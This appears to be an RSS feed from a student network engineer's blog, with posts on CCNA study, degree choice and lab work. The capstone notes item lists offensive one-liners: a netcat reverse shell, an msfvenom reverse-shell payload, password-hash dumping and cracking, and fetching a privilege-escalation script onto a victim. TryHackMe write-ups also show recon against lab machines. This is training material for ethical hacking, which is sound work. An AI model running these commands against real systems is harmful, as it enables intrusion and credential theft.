channel.title: Posts on tox@box
channel.description: Recent content in Posts on tox@box

item.title: Why I Choose the BSIT over the BSNES at WGU
item.description: When I committed to Western Governors University this year, the obvious choice on paper seemed to be the B.S. in Network Engineering and Security (BSNES). After all, I’ve already built my career trajectory around infrastructure and security engineering, getting a decent foundation in each from the cybersecurity side (see my earlier CTFs), and the networking side with my CCNA, GNS3 labbing, & inclusion on network tasks at work. But after reviewing the curricula side-by-side, I made a deliberate decision to enroll in the B.S. in Information Technology (BSIT) instead.

item.title: Senior Year, Certified: Road to CCNA and a National Title
item.description:
Make sure to read my last post before reading this one. I also recommend reading all of my CCNA chronicles.

May 2025 will be a month I’ll never forget.

I graduated Summa Cum Laude from both Twinsburg High School and the Cuyahoga Valley Career Center (CVCC), completed the Cisco Networking Academy program, passed the Cisco CCNA, and was named the #1 Student Network Engineer in the Nation at Business Professionals of America (BPA) Nationals in Orlando.

item.title: CCNA Chronicles: I passed!
item.description:
So after two years as a Cisco NetAcad student, I finally passed my Cisco CCNA.

I’m definitely blessed, and I give God all the glory for my understanding of network engineering. I just want to share with you all the blueprint that I used as a NetAcad student that went through CCNA1, 2, and 3, but also the ways that you can self-study via free online materials.

How did I do it?

If you gain nothing else from this blog post, please know that Boson ExSim for CCNA 200-301 was the glue that kept all of my studies together in my mind for the exam and subsequent BPA national conference competition (blog post on this coming soon!). Please follow John Katende’s framework for studying.

item.title: CCNA Chronicles: L2 Security Lab
item.description:
Overview

In this lab, we’ll implement foundational Layer 2 security mechanisms on a Cisco Catalyst 3560X switch. These features protect against common attack vectors like ARP spoofing, rogue DHCP servers, and IP address impersonation. This lab also incorporates inter-VLAN routing using our 3560x (Requires GNS3).

Security Mechanisms Covered:

  • DHCP Snooping
  • Dynamic ARP Inspection (DAI)
  • IP Source Guard (IPSG)

Lab Topology (GNS3 / Packet Tracer)

Device Interface Description
Switch Fa0/2-4 PCs (VLAN 10)
Fa0/5 Legit DHCP Server
Fa0/6 PC on VLAN 20
Fa0/7 Rogue DHCP Server

VLAN Assignments:

item.title: CCNA Chronicles: CCNA3
item.description:
As of this writing, I’ve just begun CCNA3, the final course in Cisco’s Networking Academy sequence for the 200-301 certification. The journey so far has been both technical and transformative. The earlier phases of study—CCNA1 and CCNA2—focused heavily on foundational Layer 2 technologies: Ethernet LAGs, switching, VLANs, spanning tree, and wireless LAN configs.

Now, with CCNA3 underway, the shift toward Layer 3 routing and network automation has been refreshing. I’m currently working through topics like OSPFv2/v3, inter-VLAN routing, first-hop redundancy protocols, and IPv6—all with the added lens of programmable infrastructure. Cisco Packet Tracer and GNS3 have definitely helped bridge the gap between theory and practice, while CLI automation and structured troubleshooting frameworks have been pushing me to think more like an engineer than just a technician.

item.title: FreeNginx, the new fork of Nginx by Dounin
item.description: One of the key developers of Nginx, the most popular web server in the world (managing 1/3 of all delivered & proxied web pages on the Internet), has announced his withdrawal from the project. Unlike the current Nginx project & its earlier fork named Angie, the new fork, named freenginx, aims to “be run by developers, and not corporate entities.” This comes after the acquisition of Nginx, Inc. by F5 in 2019, the same year two Nginx leaders were coincidentally detained and interrogated by the FSB (another story to research).

item.title: Using Dark Visitors to Safeguard from AI Bot Agents
item.description: In the ever-evolving landscape of the internet, websites are constantly under the watchful eyes of various entities, including search engines and automated bots. While search engines play a crucial role in driving organic traffic to your site, not all bots have good intentions. Some automated agents, powered by artificial intelligence (AI), may scrape your website content for malicious purposes, including content theft, data mining, SEO manipulation, price scraping, vulnerability scanning, DDoS attacks, etc. This is where the humble robots.txt file steps in as your first line of defense.

item.title: Get Free IT Certification Prep via Public Library
item.description:
Are you struggling to find adequate resources to get certified in IT & Cybersecurity?

In this blog post, we’ll walk step-by-step into the process of obtaining a free Udemy Business account, unlocking a load of new educational content for all the CompTIA & Cisco certifications your heart desires.

For those of you reading from CVCC, we are a CompTIA Academic Partner – any students serious about their career may take these certifications on their own time for cheap. Get your study up!!!

item.title: Practical Ethical Hacking Capstone NOTES
item.description:
• hashdump — dump all user hashes (alternative to /etc/shadow)
  • nc -lvp 4444 — netcat listening verbose port 4444
  • nc 192.168.1.1 4444 -e bin/sh — netcat connect to 192.168.1.1 on port 4444, establish /bin/sh (cmd.exe)
  • python3 -c ‘import pty;pty.spawn("/bin/bash")’ to stabilize pseudo-shell
    • first use “which python” to check if python 3 is installed
  • /robots.txt for easy osint
  • https://vk9-sec.com/ssh2john-how-to/ — tutorial for johntheripper ssh hash cracking:
    • /usr/share/john/ssh2john.py id_rsa > forjohn.txt
    • john --wordlist=/home/kali/rockyou.txt forjohn.txt
    • ssh -i id_rsa example@0.0.0.0 to log into user with id_rsa key
  • john --format=‘dynamic=sha512($p.$s)’ --wordlist=/home/kali/rockyou.txt hash.txt
    • cracks sha512 formatting with hash.txt
    • hash.txt contains password$hash
  • linPEAS & GTFObins — resources for privesc
    • wget http://[hostip]/linpeas.sh linpeas.sh on victim machine
    • python python3 -m http.server 80 on host machine
  • msfvenom -p windows/x64/shell_reverse_tcp LHOST=[hostip] LPORT=9090 -f exe > example.exe
    • leverages directory without quotes for a reverse shell
  • dnsrecon -r 127.0.0/24 -n [target ip] -d whatever
    • for usage when dns (port 53) is open
    • -d (domain) is needed, though the string after can be anything

item.title: TryHackMe Writeup | Expose
item.description:
Introduction/Overview

  • Challenge Name: Expose
  • My Rating: Medium
  • Category: Linux exploitation
  • /etc/hosts: expose.thm
  • Author: 1337rce
  • Description: Use your red teaming knowledge to pwn a Linux machine.

Scanning/Recon & Initial Exploitation

As per usual, we start with a broad nmap scan of all ports with nmap -p- expose.thm, which returns us something similar to the following:

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt

After investigating tcp port 1337 with nmap expose.thm -p 1337, we find a webserver. With these services, we may begin directory fuzzing on 1337 (i use gobuster)

item.title: TryHackMe Writeup | Net Sec Challenge
item.description:
Introduction/Overview

  • Challenge Name: Net Sec Challenge

  • Description: Basic Enumeration of a box, meant as practice of Network Security concepts. Completed only using nmap & hydra.

  • IP Address: 10.10.57.45 (Example)

Enumeration

  • Web Application:
    • URL: http://10.10.57.45 (Example)
  • Vulnerabilities:
    • Identify any potential vulnerabilities or misconfigurations.

[Question 1.1] Launch the AttackBox and the target VM.

  • No answer needed, simply click the button

[Question 2.1] What is the highest port number being open less than 10,000?

item.title: TryHackMe Writeup | Internal (Hard)
item.description:
Introduction/Overview

  • Challenge Name: TryHackMe
  • Category: Penetration Testing Challenge
  • Points: 60
  • Author: TheMayor
  • Description: Complex Linux & Docker exploitation without the usage of metasploit (usage of CVE-2021-4034).

Scanning/Recon

  • IP Address: 10.10.174.253

Inital scan with nmap -p- 10.10.174.253 and later nmap -A -p 22,80, resulting in

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

A default apache web server & ssh service are found on the machine. Naturally, I take to gobuster with this info, after adding 10.10.174.253 to my /etc/hosts as internal.thm –

item.title: Welcome!
item.description:
Thank you for stopping by.

This blog exists as a living record of my development as a network engineer. What started as a simple repository for notes and troubleshooting steps has grown into a place where I reflect on lessons learned—both in the lab and in the field—as I pursue professional growth through certifications, hands-on experience, and real-world infrastructure projects.

Who This Site Is For

If you’re currently enrolled in a networking class, preparing for certification, or already working in network support or systems administration, this site was built with you in mind. The material I share is meant to strike a balance between foundational concepts and applied skills. Whether it’s interpreting routing table outputs, designing VLAN topologies, building GNS3 simulations, or implementing basic CLI automation with Ansible, I document what I’ve learned in a way that’s intended to be both practical and digestible.
